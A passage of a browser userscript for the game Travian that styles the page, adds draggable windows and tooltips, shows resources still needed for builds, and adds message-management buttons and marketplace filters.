randomizeIDs();
//RunTime[3] = new Date().getTime();

acss =	"table#"+allIDs[0]+" {width:100%; border-collapse:collapse; font-size:8pt; text-align:center; background-color:white; padding:2px; margin:1px;}" +
	"table#"+allIDs[0]+" td {background-color:transparent; border:1px solid silver; padding:2px;}" +
	"table#"+allIDs[0]+" td."+allIDs[18]+" {background-color:#FFE4B5;}" +
	"table#"+allIDs[1]+" {border-collapse:collapse; text-align:left; background-color:white; padding:0px; margin:0px;}" +
	"table#"+allIDs[1]+" tr {height:18px;border-collapse:collapse; text-align:left;}" +
	"table#"+allIDs[1]+" td {font-size:8pt;overflow:visible;white-space:nowrap;background-color:transparent; border:1px solid silver; padding:0px;}" +
	"table#"+allIDs[1]+" td."+allIDs[11]+" {font-size:8pt;background-color:#FFFFAF; text-align:right;}" +
	"table#"+allIDs[1]+" td."+allIDs[12]+" {background-color:#FFFFAF;height:18px; text-align:center; font-size:11px;}" +
	"table#"+allIDs[1]+" th {border:1px solid silver;height:18px;text-align:left;direction:ltr;white-space:nowrap;}" +
	"table#"+allIDs[1]+" th a {color:black; font-size:11px; "+(ver4FL?"":'font-family: "Arial", "Helvetica", "Verdana", sans-serif;')+"}" +
	"."+allIDs[2]+" {width: 200px; }" +
	"div#"+allIDs[3]+" {position:absolute;z-index:10000;border:1px solid silver;text-align:center;background-color:#FFFFE0;}" +
	"."+allIDs[4]+" {position:absolute;border:1px solid silver;text-align:center;background-color:yellow;border-radius:5px;}" +
	"."+allIDs[5]+" {width:100%;height:6px;text-align:center;background-color: #D0D0FF;cursor:move;font-size:6pt;}"+
	"table#"+allIDs[6]+" {width:auto;border-collapse:collapse; text-align:left; background-color:#F0F0F0; margin:1px;}" +
	"table#"+allIDs[6]+" td {background-color:transparent; border:1px solid silver; padding:2px;}" +
	"table#"+allIDs[6]+" td input {width:150px;text-align:right}" +
	"."+allIDs[7]+" {width:auto;border-collapse:collapse; text-align:left; background-color:transparent; margin:1px;}" +
	"."+allIDs[7]+" td {background-color:transparent; border:1px solid silver; padding:0px 2px;text-align:right;}" +
	"."+allIDs[7]+" td img {margin:0px 3px;}" +
	"table#"+allIDs[8]+" {min-width:350px;width:auto;border-collapse:collapse; text-align:left; background-color:#F8F8F8; margin:1px;}" +
	"table#"+allIDs[8]+" tr {border-collapse:collapse; text-align:left;} table#"+allIDs[8]+" tbody tr:hover {background-color:#E5E5F0;}" +
	"table#"+allIDs[8]+" td {overflow:visible;white-space:nowrap;background-color:transparent;padding:0px 5px 1px;}" +
	"table#"+allIDs[8]+" td a {color:black;} table#"+allIDs[8]+" thead td {text-align:center;}" +
	"table#"+allIDs[8]+" td."+allIDs[17]+" {text-align:right;font-size:8pt;}" +
	"table#"+allIDs[8]+" td."+allIDs[10]+" {font-size:11px;width:54px;border:1px solid silver;background-color:transparent;padding:0px;}" +
	"table#"+allIDs[9]+" {width:auto;border-collapse:collapse; background-color:white; margin:0px;}" +
	"table#"+allIDs[9]+" tr {border-collapse:collapse;} table#"+allIDs[9]+" tbody tr:hover {background-color:#E5E5F0;}" +
	"table#"+allIDs[9]+" td {white-space:nowrap;text-align:left;background-color:transparent;padding:0px 5px 1px;}" +
	"table#"+allIDs[9]+" thead td {font-weight:bold;color:#3C3C3C;} table#"+allIDs[9]+" a {font-size:12px;"+(ver4FL?"color:#252525;font-weight:normal;":"")+"}" +
	"."+allIDs[10]+"1 {width:100%;background-color:"+bgcolor[0]+";float:left;margin:0px; display:inline;padding:0px 2px;}" +
	"."+allIDs[10]+"2 {width:100%;background-color:"+bgcolor[1]+";float:left;margin:0px; display:inline;padding:0px 2px;}" +
	"."+allIDs[10]+"3 {width:100%;background-color:"+bgcolor[2]+";float:left;margin:0px; display:inline;padding:0px 2px;}" +
	/* "table#vlist {border-collapse:collapse;}" + */"table#vlist tbody td {background-color:transparent;} table#vlist tr:hover {background-color:#E5E5F0;}" +
	"."+allIDs[13]+" {width:100%; border-collapse:collapse; border:1px solid silver;margin-bottom:15px;} ."+allIDs[13]+" td{text-align:center; background-color:#FFC0C0; padding:1px; margin:1px;}" +
	"."+allIDs[19]+" {border:1px solid silver; text-align:right;}" +
	"tbody."+allIDs[20]+" {background-color:#F8FFEE;} tbody."+allIDs[20]+" td {background-color:transparent;text-align:center;} tbody."+allIDs[20]+" th {background-color:transparent;}" +
	"."+allIDs[21]+" {border-collapse:collapse;background-color:transparent;} ."+allIDs[21]+" td {background-color:transparent;}" +
	"button."+allIDs[15]+" {color:black;border-width:2px;border-style:outset;border-color:#C6B7A2;background-color:#C6B7A2;padding:0px 5px;margin:1px 2px;}" +
	"."+allIDs[24]+" { visibility:hidden; display:none; position:absolute; top:-100px; left:-100px; }" +
	"."+allIDs[25]+" { position:absolute; top:0px; left:0px; visibility:visible; display:block; width:100%; height:100%; background-color: black; z-index: 20000; opacity:0.7; padding-top: 20%; }" +
	"."+allIDs[26]+" { text-align:center; width:66%; background-color:#000015; color:white; font-size:large; border:dashed 2px #FF00AA; padding:9px; } ."+allIDs[26]+" button {color:white;}" +
	"span."+allIDs[29]+" { visibility:hidden; display:none; }" +
	"."+allIDs[42]+" {background-image:none !important; background-color:white; border:thin solid #000000; padding-top: 3px; border-radius: 2em; -moz-border-radius: 2em;" +
		"font: normal normal 600 "+(ver4FL?"14px/16px Arial":"12px/16px Verdana,Arial,Helvetica,sans-serif !important; z-index:19; text-align:center; position:absolute; visibility:hidden") +
		"; line-height:16px !important; width:22px !important; height:19px !important;}" +
	"table#"+allIDs[31]+" td a {color:black;font-weight:normal;}" +
 	"."+allIDs[32]+" { padding:0px 2px;cursor:pointer;height:11px;width:12px;background: url("+img_hide+") no-repeat 0px 0px; }" +
	"."+allIDs[33]+" { height:12px !important;width:18px !important;background: url("+img_car+") no-repeat 0px 0px !important; }" +
	"."+allIDs[34]+" { height:12px !important;width:18px !important;background: url("+img_def+") no-repeat 0px 0px !important; }" +
	"."+allIDs[35]+" { height:12px;width:18px;background: url("+img_att+") no-repeat 0px 0px !important; }" +
	"."+allIDs[36]+" { height:8px;width:11px;background: url("+img_igm+") no-repeat 0px 0px;margin:0px 3px; }" +
	"."+allIDs[37]+" { height:10px;width:12px;background: url("+img_info+") no-repeat 0px 0px;margin:0px 3px; }" +
	"."+allIDs[38]+" { height:12px;width:16px;background: url("+img_edit+") no-repeat 0px 0px;cursor:pointer; }" +
	"."+allIDs[39]+" { height:12px;width:16px;background: url("+img_del+") no-repeat 0px 0px;cursor:pointer; }" +
	"."+allIDs[47]+" { height:12px;width:12px;background: url("+img_tinfo+") no-repeat 0px 0px;margin:0px 5px; }" +
	"img."+allIDs[45]+" {margin:0px 3px;} ."+allIDs[46]+" * {background-color:#ECECEC !important;}";

if( /karte|position/.test(crtPath) ) acss += "."+allIDs[40]+" { height:12px;width:16px;background: url("+img_clipIn+") no-repeat 0px 0px;cursor:pointer; }"+
	"."+allIDs[41]+" { height:12px;width:16px;background: url("+img_clipOut+") no-repeat 0px 0px;cursor:pointer; }";

if( ver4FL ) { acss += "table#vlist td{padding:0;line-height:16px;text-align:"+docDir[0]+";white-space:nowrap;}table#vlist thead td{background-color:#FFF;height:22px;text-align:center;padding:0px 3px;}" +
	"table#vlist td.dot{width:10px;padding:0 3px;}table#vlist td.link{padding-right:10px;}table#vlist thead td a{font-weight:bold;color:#3C3C3C;}" +
	"table#vlist tbody td{font-size:12px;padding:0 2px;}table#vlist td.hl{color:#FF8000;}table#vlist td.link{font-size:14px;}table#vlist {border-collapse:collapse;}" +
	"table#vlist td a{font-weight:normal;color:#252525;}table#vlist td a.active{font-weight:bold;color:#252525;}" + //#FF8000;
	"div#build.gid17 table.send_res td {padding:2px 3px;} div.alliance table#offs td.sub div {"+(ltr?"padding-left":"padding-right")+":44px;}" +
	"div.subjectWrapper {width:95% !important; margin-"+docDir[0]+";"+docDir[0]+":16px;} div.reports table#overview td.sub .iReport {position:relative;"+docDir[0]+":-4px;}" +
	"td.coords,th.coords a{white-space:normal !important;} #side_info .listing ul li:hover a {background-color:white;} #side_info .listing ul {padding-"+docDir[1]+":16px;}";

	if( ver42FL ) {
	acss += "span."+allIDs[48]+" {position:relative;float:"+docDir[0]+";margin-top:-17px;padding-top:3px;height:15px;left:110px !important;}"+
	"span."+allIDs[48]+" a {display:inline !important;margin:0px !important;padding:0px !important;width:18px !important;left:auto !important;position:relative;}"+
	"span."+allIDs[48]+" img {left:0 !important;top:0 !important;position:relative !important;}"+
	"ul#outOfGame {width:180px} div.name {white-space:nowrap}";
	} else {
	acss += "span."+allIDs[48]+" {position:relative;float:"+docDir[1]+";margin-top:-17px;padding-top:3px;height:15px;background-color:#F7EBBE;} span."+allIDs[48]+" a {display:inline !important;margin:0px !important;}"+
	"#side_info #villageList a.attackVillageName {display:block !important; margin-"+docDir[0]+":17px !important;} #side_info #villageList img.attackIcon {float:"+docDir[0]+"}";
	}
}

GM_addStyle(acss);

/*************tooltips elements*****************/
function makeTooltip( ttObj ) {
	var ttD = $g(allIDs[3]);
	if( ! ttD ) {
		ttD = $e('DIV', [['id', allIDs[3]]]);
		document.body.appendChild(ttD);
		document.addEventListener("mousemove", updateTooltip, false);
	}
	ttD.appendChild( ttObj );
	return ttD;
}
function removeTooltip() {
	var ttD = $g(allIDs[3]);
	if( ttD ) {
		document.removeEventListener("mousemove", updateTooltip, false);
		document.body.removeChild(ttD);
		timerP.length = lastTimerP[0];
		timerB.length = lastTimerB;
	}
}
function updateTooltip(e){
	updatePosition( allIDs[3], [e.pageX,e.pageY] );
}
function updatePosition( wn, xy, sh ){
	var ttD = $g(wn);
	if( ! ttD ) return;
	var dW = ttD.clientWidth;
	var dH = ttD.clientHeight;
	var y = xy[1] + 8;
	if( sh ) {
		var x = RB.XY[sh*2];
	} else {
		var x = xy[0] + 8;
		if (x + dW > window.innerWidth + window.scrollX) x = x > dH + 16 ? x - dW - 16: 0;
	}
	ttD.style.left = x + "px";
	if (y + dH > window.innerHeight + window.scrollY) y = y > dH + 16 ? y - dH - 16: 0;
	ttD.style.top = y + "px";
};
function addToolTip (newITT,nd) {
	if( newITT ) {
		tiImg = trImg(allIDs[47]);
		tiImg.addEventListener("mouseover", function () { makeTooltip(newITT); }, false);
		tiImg.addEventListener("mouseout", removeTooltip, false);
		nd.appendChild(tiImg);
	}
}
/*************drag elements*****************/
var dragMaster = (function() {
	var dragObject;
	var mouseOffset;
	var mouseDownAt;
	function getMouseOffset(target, e) {
		var docPos = offsetPosition(target);
		return {x:e.pageX - docPos[0], y:e.pageY - docPos[1]};
	}
	function mouseUp(){
		if (mouseDownAt) {
			mouseDownAt = null;
		} else {
			savePosition(dragObject);
			dragObject = null;
		}
		document.removeEventListener('mousemove', mouseMove, true);
		document.removeEventListener('mouseup', mouseUp, true);
	}
	function mouseMove(e){
		if (mouseDownAt) if (Math.abs(mouseDownAt.x-e.pageX)<10 && Math.abs(mouseDownAt.y-e.pageY)<10) return;
		with(dragObject.style) {
			position = 'absolute';
			top = e.pageY - mouseOffset.y + 'px';
			left = e.pageX - mouseOffset.x + 'px';
		}
		mouseDownAt = null;
		return false;
	}
	function mouseDown(e) {
		if (e.which!=1) return;
		dragObject  = this.parentNode;
		mouseOffset = getMouseOffset(this, e);
		mouseDownAt = { x: e.pageX, y: e.pageY, dragObject: this };
		document.addEventListener('mousemove', mouseMove, true);
		document.addEventListener('mouseup', mouseUp, true);
		return false;
	}
	return {
		makeDraggable: function(element){
			element.addEventListener('mousedown', mouseDown, true);
		}
	}
}())
/**********end**drag elements*****************/

function savePosition(objName) {
	objNum = parseInt(objName.id.match(/\d+$/)[0]);
	if( objNum > 20 ) return;
	RB.XY[objNum*2] = objName.style.left.match(/^\d+/)[0];
	RB.XY[objNum*2+1] = objName.style.top.match(/^\d+/)[0];
	saveCookie('xy', 'XY');
}

var divSN = 100;
function makeFloat(flObj, ix, iy, sid) {
	flId = sid !== undefined ? sid : ++divSN;
	var zindex = 5999;
	switch (flId) {
		case 4:  zindex = 9999; break;
		case 21:  zindex = 10001; break;
	}
	bd = $e('div',[['id',allIDs[14] + flId],['class',allIDs[4]],['style','left:'+ ix +'px;top:'+ iy +'px;z-index:'+ zindex +';']]);
	bdr = $ee('div','',[['class',allIDs[5]],['onmousedown',jsNone]]);
	bd.appendChild(bdr);
	bd.appendChild(flObj);
	document.body.appendChild(bd);
	dragMaster.makeDraggable(bdr);
	return allIDs[14] + flId;
}

function makeFloatD(flObj, mNum) {
	var ix = RB.XY[mNum*2] < 1 ? 1: RB.XY[mNum*2];
	var iy = RB.XY[mNum*2+1] < xyBody[1] ? xyBody[1]: RB.XY[mNum*2+1];
	return makeFloat(flObj, ix, iy, mNum);
}

function closeWindowN ( num ) {
	if( windowID[num] == undefined ) return false;
	var wo = $g(windowID[num]);
	if( ! wo ) return false;
	wo.parentNode.removeChild(wo);
	windowID[num] = undefined;
	return true;
}

function bodyHide ( body ) {
	if( body[0].getAttribute('style',2) === null ) {
		body[0].setAttribute('style','display:none');
		RB.bodyH[body[1]] = 1;
		if( body[2] ) body[2].style.backgroundPosition = '0px -12px';
	} else {
		body[0].removeAttribute('style');
		RB.bodyH[body[1]] = 0;
		if( body[2] ) body[2].removeAttribute('style');
	}
	saveCookie('bodyH', 'bodyH');
}

/************************** build pages ****************************/

// begin Travian - add needed resources automatically under build/upgrade link
function needed_show( base ) {
	function saveWantsMem ( wantsResM ) {
		var noplace = '';
		var ofFL = false;
		for( var i = 0; i< 4; i++ ) if( wantsResM[i+5] > fullRes[i] ) ofFL = true;
		if( ofFL ) {
			noplace = gtext("noplace");
			if( wantsResM[4] != village_aid ) RB.wantsMem = [0,0,0,0,0,0,0,0,0,0];
		} else RB.wantsMem = wantsResM.slice();
		RB.wantsMem[4] = village_aid;
		saveCookie('Mem', 'wantsMem');
		alert( noplace +"\nSaved: "+ RB.wantsMem[0] +" | "+ RB.wantsMem[1] +" | "+ RB.wantsMem[2] +" | "+ RB.wantsMem[3] );
	}
	function showPlusTimer () {
		var j=timerB.length;
		timerB[j] = new Object();
		timerB[j].time = Math.abs(Math.round(wantsRes/incomepersecond[e]));
		timerB[j].obj = $eT('SPAN', timerB[j].time, 0);
		return timerB[j].obj;
	}

	var neededRes = base.match(/>(\d+).+?>(\d+).+?>(\d+).+?>(\d+)/);
	wfl = false;
	var wantsResMem = [0,0,0,0,0,0,0,0,0,0];
	var wantsResMemP = RB.wantsMem.slice();

	var forNPC = [0,0];
	var beforeThis = $e('DIV');
	for (var e = 0; e < 4; e++) {
		wantsResMem[e+5] = parseInt(neededRes[e+1]);
		wantsResMemP[e+5] = parseInt(wantsResMemP[e+5]) + wantsResMem[e+5];
		var wantsRes = resNow[e] - wantsResMem[e+5];
		var wantsResP = resNow[e] - wantsResMemP[e+5];
		if (wantsResP < 0) wantsResMemP[e] = Math.abs(wantsResP);
		forNPC[0] += wantsRes;
		forNPC[1] += incomepersecond[e];
		beforeThis.appendChild(trImg('r' + (e+1)));
		if (wantsRes >= 0) {
			if( income[e] < 0 )
				beforeThis.appendChild($em('SPAN',['+'+ wantsRes+ ' (',showPlusTimer(),') '],[['style','color:green;']]));
			else
				beforeThis.appendChild($ee('SPAN','+'+ wantsRes +' ',[['style','color:green;']]));
		} else {
			beforeThis.appendChild($em('SPAN',[wantsRes + ' (',(income[e] > 0 ? showPlusTimer(): '--:--'),') '],[['style','color:red;']]));
			wantsResMem[e] = Math.abs(wantsRes);
			wfl = true;
		}
	}
	if( RB.Setup[11] > 0 && forNPC[0] < 0 ) {
		var j=timerB.length;
		timerB[j] = new Object();
		timerB[j].time = Math.abs(Math.round(forNPC[0]/forNPC[1]));
		timerB[j].obj = $eT('SPAN', timerB[j].time, 0);
		beforeThis.appendChild($em('SPAN',['(',trImg('npc_inactive'),' ',timerB[j].obj,') ']));
	}
	var memP = $a('(M)',[['href',jsVoid]]);
	memP.addEventListener('click', function(x) { return function() { saveWantsMem(x); }}(wantsResMem), 0);
	beforeThis.appendChild(memP);
	if( RB.wantsMem[4] == village_aid ) {
		var memP = $a(' (M+)',[['href',jsVoid]]);
		memP.addEventListener('click', function(x) { return function() { saveWantsMem(x); }}(wantsResMemP), 0);
		beforeThis.appendChild(memP);
	}

	return beforeThis;
}

function neededResAdd () {
	function addToTime( base ) {
		var needTime = base.innerHTML.match(/>(\d+:\d+:\d+)/)[1];
		if( ver4FL ) {
			$gc('clocks',base)[0].title=RB.dictionary[14]+formatTime(absTime(toSeconds(needTime)),4);
			if( ver42FL ) {
				var gold = $gc('gold',base);
				if( gold.length > 0 ) {
					gold[0].addEventListener('click', function(x) { setTimeout(npcForTroops,250); }, 0);
				}
			}
		} else {
			var newTime = '<span title="'+RB.dictionary[14]+formatTime(absTime(toSeconds(needTime)),4)+'">'+needTime+'</span>';
			base.innerHTML = base.innerHTML.replace(needTime,newTime);
		}
	}

	var basee = $g("contract");
	if ( basee || ver4FL ) {
		var baseX = ver4FL ? $xf('.//div[@class="showCosts"]','l',cont) : $xf('.//p[@id="contract"]','l',cont);
		for( var i = 0; i < baseX.snapshotLength; i++ ) {
			var base = baseX.snapshotItem(i).innerHTML;
			addToTime( baseX.snapshotItem(i) );
			var newD = needed_show( base );
			if( wfl || baseX.snapshotItem(i).parentNode.getAttribute("class") != "details" ) baseX.snapshotItem(i).appendChild( newD );
		}
	} else  {
		var base = $g("build");
		if ( ! base ) return;
    	if ( /new_build/i.test(base.innerHTML) ) {
			var basee = $gc("res",base);
			for ( var i=0; i<basee.length; i++ ) {
				addToTime( basee[i] );
				basee[i].appendChild(needed_show( basee[i].innerHTML ));
			}
		}
	}
	var research = $xf('.//td[@class="desc"]/div[@class="details"]','l',cont);
	for( var i = 0; i < research.snapshotLength; i++ ) {
		var base = research.snapshotItem(i);
		addToTime( base );
		var newD = needed_show( base.innerHTML );
		if( wfl ) base.parentNode.appendChild( newD );
	}
	lastTimerB = timerB.length;
}
// end Travian - add needed resources automatically under build/upgrade link

/********************* messages & reports ***************************/

function deleteButtonAddT4() {
	if(($g("sAll"))) return;

	function removeBTX () {
		$g('sAll').checked = false;
	}

	var patt = [["administration","class","checkAll","delmsg"],
				["footer","id","markAll","del"]];
	var tt = /nachrichten.php/.test(crtPath) ? 0: 1;
	var mtable = $xf('.//form/div[@class="'+patt[tt][0]+'"]','f',cont);
	if( ! (mtable) ) return;
	var cbDiv = $e('DIV',[[patt[tt][1],patt[tt][2]]]);
	cbDiv.innerHTML = '<input class="check" type="checkbox" id="sAll" name="sAll" onclick="$(this).up(\'form\').getElements(\'input[type=checkbox]\').each(function(element){element.checked=this.checked;},this);"/>';
	mtable.insertBefore(cbDiv, mtable.firstChild);

	var btn_del = $g(patt[tt][3]);
	if( btn_del ) {
		btn_del.addEventListener('click', removeBTX, true);
	}
}

function deleteButtonAdd() {
	if( ver4FL ) { deleteButtonAddT4(); return; }

	function removeBTX () {
		var rm = $g('s10');
		if( rm ) rm.parentNode.removeChild(rm);
		var rm = $g(btnID);
		if( rm ) rm.parentNode.removeChild(rm);
	}

	var mtable = $xf("//table[@id='overview']/tfoot/tr/th", "r");
	var btn_add = false;
	var plusFL = false;
	if ( mtable.snapshotLength == 3 ) {
		if( ! /checkbox/i.test(mtable.snapshotItem(0).innerHTML) ) {
			mtable.snapshotItem(0).innerHTML = '<input class="check" id="s10" name="s10" onclick="Allmsg(this.form);" type="checkbox">';
			btn_add = true;
			plusFL = true;
		}
	}
	var tm = $g('textmenu');
	var tm_l = $gt('A',tm).length;
	var btnType = 'archive';
	var btnID = 'btn_archiv';
	if( /nachrichten.php/.test(crtPath) ) {
		if( /\?t=3/.test(crtPath) ) {
			btnType = 'start';
			btnID = 'btn_back';
		}
		if( /\?t=2/.test(crtPath) ) btn_add = false;
		if( tm_l < 4 ) tm.innerHTML += ' | <a href="nachrichten.php?t=3">'+gtext("archive")+'</a>';
	} else {
		if( /\?t=5/.test(crtPath) ) {
			btnType = 'start';
			btnID = 'btn_back';
		}
		if( tm_l < 6 ) tm.innerHTML += ' | <a href="berichte.php?t=5">'+gtext("archive")+'</a>';
	}
	if( btn_add )
		mtable.snapshotItem(1).innerHTML += '&nbsp;<input id="'+btnID+'" class="dynamic_img" type="image" src="img/x.gif" alt="'+btnType+'" name="'+btnType+'" value="'+btnType+'"/></input>';

	var mtable = $gn('msg')[0];
	if( mtable ) {
		var i = crtPath.split("?")[1];
		if( i ) {
			i = i.replace(/t=\d&?/g,"");
			if( i ) mtable.action += '?' + i;
		}
	}

	if( plusFL ) {
		var btn_del = $g('btn_delete');
		if( btn_del ) {
			btn_del.addEventListener('click', removeBTX, true);
		}
	}
}

function convertCoordsInMessagesToLinks() {
	var cM = $xf("//div[@*='message']");
	if( cM ) {
		var arXY = [];
		var iHTML = cM.innerHTML;
		var iHTML2 = iHTML;
		var j = 0;
		var villageLink = [];
		var Rej = /<a.+?\/a>/gi; // new Travian IGM extended tags
		while ((arXY = Rej.exec(iHTML)) != null) {
			var mLink = arXY[0];
			villageLink[j] = "<span>" + mLink + "</span>";
			iHTML2 = iHTML2.replace(mLink, "<#!" + (j++) + "/>");
		}
		var Rej = /(https?:\/\/[\S]+)(<.*>|$| )+?/gi; // URLs
		while ((arXY = Rej.exec(iHTML)) != null) {
			var mLink = arXY[1].match(/(.*?)(?:\.|,|<|\))?$/)[1];
			villageLink[j] = "<span><a target='_blank' href='" + mLink + "'>" + mLink + "</a></span>";
			iHTML2 = iHTML2.replace(mLink, "<#!" + (j++) + "/>");
		}
		var Rej = /[\/:]?(-?\d+)(?:<.+?>)?\s*?([\|\/\\ ])?(?:<.+?>)?\s*?(-?\d+)(?![\$\/%\d:])/g;
		while ((arXY = Rej.exec(iHTML)) != null) {
			if( /^[\/:]/.test(arXY[0]) ) continue;
			if( ! ( arXY[2] != undefined || arXY[3] < 0 )) continue;
			if( Math.abs(arXY[1]) > 400 || Math.abs(arXY[3]) > 400 ) continue;
			villageLink[j] = "<span><a href='karte.php?"+ (ver4FL?"x="+arXY[1]+"&y="+arXY[3]:"z="+xy2id(arXY[1], arXY[3])) +"'>"+ arXY[0] +"</a></span>";
			iHTML2 = iHTML2.replace(arXY[0], "<#!" + (j++) + "/>");
		}
		for( var i = 0; i < j ; i++ ) {
			iHTML2 = iHTML2.replace("<#!" + i + "/>", villageLink[i]);
		}
		villageLink.length = 0;
		cM.innerHTML = iHTML2;
		var mLinks = $xf('.//span/a','l',cM);
		for( var i = 0; i < mLinks.snapshotLength; i++ ) {
			distanceTooltip(mLinks.snapshotItem(i),0);
			sendResTropAdd(mLinks.snapshotItem(i), 1);
			linkHint(mLinks.snapshotItem(i));
		}
	}
}

/************************* market place ****************************/

// market filter on buy page
function applyFilter_hide() {
	var market = $g("range").tBodies[0].rows;
	for (var mr = 0; mr < market.length; mr++) {
		var market_hide = [0,0,0];
		var mf = market_all[mr].split(";");
		for ( var i = 0; i < 2; i++ ) {
			for ( var j = 1; j < 5; j++ ) {
				if( mf[i] == RB.market_fi[4*i+j-1]*j || market_fc[i] == 0 ) {
					market_hide[i] = 1;
				}
			}
		}
		if( RB.market_fi[8] == 1 && mf[2] < 1 ) market_hide[2] = 1;
		if( RB.market_fi[9] == 1 && mf[2] == 1 ) market_hide[2] = 1;
		if( RB.market_fi[10] == 1 && mf[2] >= 1 ) market_hide[2] = 1;
		if( RB.market_fi[11] == 1 && mf[2] > 1 ) market_hide[2] = 1;
		if( market_fc[2] == 0 ) market_hide[2] = 1;
		// apply filter
		if( market_hide[0]*market_hide[1]*market_hide[2] == 1 ) {
			market[mr].style.display = '';
		} else {
			market[mr].style.display = 'none';
		}
	}
}

function applyFilter_row( row ) {
	market_fc[row] = 0;
	for ( var i = 0; i < 4; i++ ) {
		var n = row*4+i;
		if ( RB.market_fi[n] != 0 ) {
			market_fc[row]++;
			market_ftd[n].setAttribute('class', allIDs[18]);
		} else {
			market_ftd[n].removeAttribute('class');
		}
	}
}

function applyFilter( fi ) {
	var row = Math.floor(fi/4);
	if( RB.market_fi[fi] == 0 && ( market_fc[row] > 2 || row > 1 )) {
		for ( var i = 0; i < 4; i++ ) {
			RB.market_fi[row*4+i] = 0;
		}
	}
	RB.market_fi[fi] = 1 - RB.market_fi[fi];
	applyFilter_row( row );
	applyFilter_hide();
	saveCookie('mf', 'market_fi');
}

function marketBuy() {
	if( ver4FL ) {
		var market = $g("range");
		if( !(market) ) return;
		if( RB.village_Var[0] > 0 ) {
			market = market.tBodies[0].rows;
			for ( var mr = 0; mr < market.length; mr++ ) {
				if( market[mr].cells.length < 5 ) break;
				var btn = market[mr].cells[5].getElementsByTagName('BUTTON');
				if( btn.length == 0 ) continue;
				var wanted = parseInt(market[mr].cells[2].innerHTML.match(/>\s*?(\d+)/)[1]);
				var totMerchants = Math.ceil(wanted / RB.village_Var[0]);
				var crtExceed = wanted - totMerchants * RB.village_Var[0];
				var newTip = RB.dictionary[2]+': '+totMerchants;
				if( crtExceed < 0 ) newTip += ' ( '+ crtExceed + ' )';
				btn[0].setAttribute('title', newTip);
			}
		}
		if( RB.dictFL[4] == 0 ) {
			var TM = $g("range").tHead.rows[0].cells[4].innerHTML.onlyText();
			if( RB.dictionary[4] != TM ) {
				RB.dictionary[4] = TM;
				saveCookie( 'Dict', 'dictionary' );
				RB.dictFL[4] = 1;
				saveCookie( 'DictFL', 'dictFL' );
			}
		}
		if( RB.dictFL[11] == 0 ) {
			try {
				var tm = $gc('active',$gc('contentNavi',cont)[0])[0].innerHTML.onlyText().trim();
			} catch(err) {
				var tm = false;
			}
			if( tm ) {
				RB.dictionary[11] = tm;
				saveCookie( 'Dict', 'dictionary' );
				RB.dictFL[11] = 1;
				saveCookie( 'DictFL', 'dictFL' );
			}
		}
		return;
	}

	if ( RB.Setup[8] == 0 ) return;
	if ( crtPath.indexOf('&t=1') == -1 && crtPath.indexOf('&t=1&u=') != -1 ) return;
	var market = $g("range");
	if( ! market ) return;

	var resIMG = [];
	for ( var i=0; i<4; i++ ) {
		resIMG[i] = $g("resWrap").getElementsByTagName("table")[0].rows[0].cells[i*2].getElementsByTagName("img")[0].getAttribute("alt");
	}

	market = market.tHead.rows;
	var TM = [];
	TM.push(market[1].cells[0].innerHTML.onlyText());
	TM.push(market[1].cells[1].innerHTML.onlyText());
	if( RB.dictFL[4] == 0 ) {
		TM.push(market[1].cells[3].innerHTML.onlyText());
		if( RB.dictionary[4] != TM[2] ) {
			RB.dictionary[4] = TM[2];
			saveCookie( 'Dict', 'dictionary' );
			RB.dictFL[4] = 1;
			saveCookie( 'DictFL', 'dictFL' );
		}
	}
	if( RB.dictFL[11] == 0 ) {
		var tm = $g('textmenu');
		if( tm ) {
			RB.dictionary[11] = $gt('A',tm)[1].innerHTML;
			saveCookie( 'Dict', 'dictionary' );
			RB.dictFL[11] = 1;
			saveCookie( 'DictFL', 'dictFL' );
		}
	}

	if( RB.Setup[8] == 1 || RB.Setup[8] == 3 ) {
		// add new 2 field (ally & x/y)
		market[0].cells[0].setAttribute("colspan","7");
		market[1].appendChild($c(RB.dictionary[1]));
		market[1].appendChild($c('<sup>x</sup>/<sub>y</sub>'));
		$g("range").tFoot.rows[0].cells[0].setAttribute("colspan","7");
	}
	// create filter table
	if( RB.Setup[8] > 1 ) {
		var p = $e('DIV');
		var newTABLE = $e('TABLE',[['id', allIDs[0]]]);
		p.appendChild(newTABLE);

		for( var i=0; i<2; i++ ) {
			var newTR = $ee('TR',$c(TM[i]));
			for( var j = 0; j < 4; j++ ) {
				var n = i*4+j;
				market_ftd[n] = $c( $e('IMG',[['alt', resIMG[j]],['title', resIMG[j]],['class', 'r' + (j+1)],['src', 'img/x.gif']]));
				market_ftd[n].addEventListener('click', function(x) { return function() { applyFilter(x); }}(n), 0);
				newTR.appendChild(market_ftd[n]);
				RB.market_fi[n] = 0;
			}
			newTABLE.appendChild(newTR);
			market_fc[i] = 0;
		}

		var newTR = $ee('TR',$c('&nbsp;'));
		var aLabels = ['k<1', '1:1', 'k>=1', 'k>1'];
		for (var i = 8; i < 12; i++){
			market_ftd[i] = $c( $a(aLabels[i-8], [['href', jsVoid]]));
			market_ftd[i].addEventListener('click', function(x) { return function() { applyFilter(x); }}(i), 0);
			newTR.appendChild(market_ftd[i]);
			RB.market_fi[i] = 0;
		};
		newTABLE.appendChild(newTR);
		$g('build').insertBefore(p, $g('range'));
	}
	// calculate offer/wanted rate
	var market = $g("range").tBodies[0].rows;
	for ( var mr = 0; mr < market.length; mr++ )
	{
		var offer
		var wanted;

		offer = market[mr].cells[0];
		wanted = market[mr].cells[1];
		ally = market[mr].cells[2];
		act = market[mr].cells[4];

		offer.value = parseInt( offer.childNodes.item(2).nodeValue );
		offer.type = offer.childNodes.item(1).getAttribute('class').substring(1);

		wanted.value = parseInt( wanted.childNodes.item(2).nodeValue );
		wanted.type = wanted.childNodes.item(1).getAttribute('class').substring(1);

		if( RB.village_Var[0] > 0 ) {
			var totMerchants = Math.ceil(wanted.value / RB.village_Var[0]);
			var crtExceed = wanted.value - totMerchants * RB.village_Var[0];
			var newTip = RB.dictionary[2]+': '+totMerchants;
			if( crtExceed < 0 ) newTip += ' ( '+ crtExceed + ' )';
			var aLink = $gt("a",act)[0];
			if( aLink ) aLink.setAttribute('title', newTip);
		}

		ally.value = ally.getAttribute('title');
		var mrate = Math.round(offer.value/wanted.value * 100)/100;

		if( RB.Setup[8] == 1 || RB.Setup[8] == 3 ) {
			act.setAttribute("style","font-size:8pt;width:20%;");
			market[mr].appendChild($c(ally.value, [['style','font-size:8pt;']]));

			var aCol = ['black', 'white'];
			if ( mrate < 1.00) aCol = ['red', '#FFE1E1']; else if ( mrate > 1.00) aCol = ['darkgreen', '#C8FFC8'];
			market[mr].appendChild($c(mrate,[['style','font-size:8pt;background-color:' + aCol[1] + '; color:' + aCol[0] + ';']]));
